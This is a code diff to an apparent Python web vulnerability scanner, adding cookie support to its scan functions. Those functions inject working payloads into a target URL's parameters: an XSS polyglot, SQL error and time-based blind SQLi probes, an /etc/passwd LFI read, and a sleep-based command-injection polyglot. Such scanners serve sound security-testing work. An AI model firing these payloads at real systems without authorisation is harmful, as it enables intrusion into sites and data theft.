@@ -13,7 +13,7 @@ firefox = Ghost()
 Description: inject a polyglot vector for XSS in every parameter, then it checks if an alert was triggered
 Parameters: vulns - list of vulnerabilities, url - address of the target, fuzz - parameter we modify
 """
-def scan_xss(vulns, url, fuzz):
+def scan_xss(vulns, url, fuzz, cookie):
 	payload = 'jaVasCript:alert(1)//" name=alert(1) onErrOr=eval(name) src=1 autofocus oNfoCus=eval(name)><marquee><img src=x onerror=alert(1)></marquee>" ></textarea\></|\><details/open/ontoggle=prompt`1` ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->" ></script><sCrIpt>confirm(1)</scRipt>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>\'"><!--'
 	payload1 = 'javascript:/*-->]]>%>?></script></title></textarea></noscript></style></xmp>">[img=1,name=/alert(1)/.source]<img -/style=a:expression&#40&#47&#42\'/-/*&#39,/**/eval(name)/*%2A///*///&#41;;width:100%;height:100%;position:absolute;-ms-behavior:url(#default#time2) name=alert(1) onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) onbegin=eval(name) background=javascript:eval(name)//>"'
 
@@ -22,7 +22,7 @@ def scan_xss(vulns, url, fuzz):
 		
 			# Send GET XSS
 			inject = url.replace(fuzz+"=", fuzz+"="+payload)
-			page, extra_resources = session.open(inject)
+			page, extra_resources = session.open(inject, headers={'Cookie':cookie}, user_agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.10 Safari/537.36 OPR/43.0.2442.7 (Edition beta)")
 			result, resources = session.wait_for_alert(1)
 
 			# Detect XSS result with an alert
@@ -41,10 +41,10 @@ def scan_xss(vulns, url, fuzz):
 Description: use a single quote to generate a SQL error in the page
 Parameters: vulns - list of vulnerabilities, url - address of the target, fuzz - parameter we modify
 """
-def scan_sql_error(vulns, url, fuzz):
+def scan_sql_error(vulns, url, fuzz, cookie):
 	payload = "'"
 	inject  = url.replace(fuzz+"=", fuzz+"="+payload)
-	content = requests.get(inject).text
+	content = requests.get(inject, cookies=cookie).text
 
 	if "SQLSTATE[HY000]" in content or "Warning: SQLite3:" in content or "You have an error in your SQL syntax" in content:
 		print "\t\t\033[93mSQLi Detected \033[0m for ", fuzz, " with the payload :", payload
@@ -58,7 +58,7 @@ def scan_sql_error(vulns, url, fuzz):
 Description: use a polyglot vector to detect a SQL injection based on the response time
 Parameters: vulns - list of vulnerabilities, url - address of the target, fuzz - parameter we modify
 """
-def scan_sql_blind_time(vulns, url, fuzz):
+def scan_sql_blind_time(vulns, url, fuzz, cookie):
 	mysql_payload     = "SLEEP(4) /*' || SLEEP(4) || '\" || SLEEP(4) || \"*/"
 	sqlite_payload    = "substr(upper(hex(randomblob(55555555))),0,1) /*' || substr(upper(hex(randomblob(55555555))),0,1) || '\" || substr(upper(hex(randomblob(55555555))),0,1) || \"*/"
 	postgre_payload   = "(SELECT 55555555 FROM PG_SLEEP(4)) /*' || (SELECT 55555555 FROM PG_SLEEP(4)) || '\" || (SELECT 55555555 FROM PG_SLEEP(4)) || \"*/"
@@ -72,7 +72,7 @@ def scan_sql_blind_time(vulns, url, fuzz):
 		# Do a request and check the response time
 		inject  = url.replace(fuzz+"=", fuzz+"="+payload)
 		time1   = datetime.datetime.now()
-		content = requests.get(inject).text
+		content = requests.get(inject, cookies=cookie).text
 		time2   = datetime.datetime.now()
 		diff    = time2 - time1
 		diff    = (divmod(diff.days * 86400 + diff.seconds, 60))[1]
@@ -92,10 +92,10 @@ def scan_sql_blind_time(vulns, url, fuzz):
 Description: will scan every parameter for LFI, checking for the common root:x:0:0
 Parameters: vulns - list of vulnerabilities, url - address of the target, fuzz - parameter we modify
 """
-def scan_lfi(vulns, url, fuzz):
+def scan_lfi(vulns, url, fuzz, cookie):
 	payload = "/etc/passwd"
 	inject  = re.sub(fuzz+"="+"(.[^&]*)", fuzz+"="+payload , url)
-	content = requests.get(inject).text
+	content = requests.get(inject, cookies=cookie).text
 
 	if "root:x:0:0:root:/root:/bin/bash" in content:
 		print "\t\t\033[93mLFI Detected \033[0m for ", fuzz, " with the payload :", payload
@@ -109,7 +109,7 @@ def scan_lfi(vulns, url, fuzz):
 Description: use a polyglot vector to detect a RCE based on the response time
 Parameters: vulns - list of vulnerabilities, url - address of the target, fuzz - parameter we modify
 """
-def scan_rce(vulns, url, fuzz):
+def scan_rce(vulns, url, fuzz, cookie):
 	""" Some tests of context
 	$ time (ping -c 3 127.0.0.1`#'|sleep${IFS}4|'`"|sleep${IFS}4|";sleep${IFS}4 )     -   real	0m4.113s
 	ping: unknown host 127.0.0.1|sleep 	
@@ -123,13 +123,13 @@ def scan_rce(vulns, url, fuzz):
 	;sleep 	
 	4  : commande introuvable
 	"""
-	# Payload URL-encoded of `#'|sleep${IFS}4|'`\"|sleep${IFS}4|\";sleep${IFS}4 "
-	payload = "%60%23%27%7Csleep%24%7BIFS%7D4%7C%27%60%22%7Csleep%24%7BIFS%7D4%7C%22%3Bsleep%24%7BIFS%7D4%20"
+	# Payload URL-encoded of `#'|sleep${IFS}4|'`\"|sleep${IFS}4|\";sleep${IFS}4"
+	payload = "%60%23%27%7Csleep%24%7BIFS%7D4%7C%27%60%22%7Csleep%24%7BIFS%7D4%7C%22%3Bsleep%24%7BIFS%7D4"
 
 	# Do a request and check the response time
 	inject  = url.replace(fuzz+"=", fuzz+"="+payload)
 	time1   = datetime.datetime.now()
-	content = requests.get(inject).text
+	content = requests.get(inject, cookies=cookie).text
 	time2   = datetime.datetime.now()
 	diff    = time2 - time1
 	diff    = (divmod(diff.days * 86400 + diff.seconds, 60))[1]
@@ -160,8 +160,22 @@ def index():
 	vulns = {'rce': 0, 'xss': 0, 'sql': 0, 'lfi': 0, 'list':''}
 	
 	# Parse requests - extract arguments
-	args  = request.args
-	url   = args['url']
+	args    = request.args
+	url     = args['url']
+	
+	# Parse cookies strings - string like name:username|value:admin
+	cookies_requests = {}
+	cookies_ghost    = ""
+	for cookie in args['cookies'].split('\n'):
+
+		c = cookie.split('|')
+		if c != '' and c != None:
+			if len(c) != 1:
+				name  = str(c[0]).replace('name:','')
+				value = str(c[1]).replace('value:','')
+				cookies_requests[name] = value
+				cookies_ghost += " "+cookie.replace('name:','').replace('value:','=').replace('|','') + ";"
+	
 
 	if "?" in url:
 		params  = url.split('?')[1]
@@ -171,13 +185,12 @@ def index():
 		# Launch scans
 		for fuzz in matches:
 			print "\n---[ New parameter " + fuzz + " for url: " + url + " ]---"
-			scan_xss(vulns, url, fuzz)
-			scan_lfi(vulns, url, fuzz)
-			scan_sql_error(vulns, url, fuzz)
-			scan_sql_blind_time(vulns, url, fuzz)
-			scan_rce(vulns, url, fuzz)
+			scan_xss(vulns, url, fuzz, cookies_ghost)
+			scan_lfi(vulns, url, fuzz, cookies_requests)
+			scan_sql_error(vulns, url, fuzz, cookies_requests)
+			scan_sql_blind_time(vulns, url, fuzz, cookies_requests)
+			scan_rce(vulns, url, fuzz, cookies_requests)
 
-	print vulns
 	# Display results as a json
 	return jsonify(vulns)
 
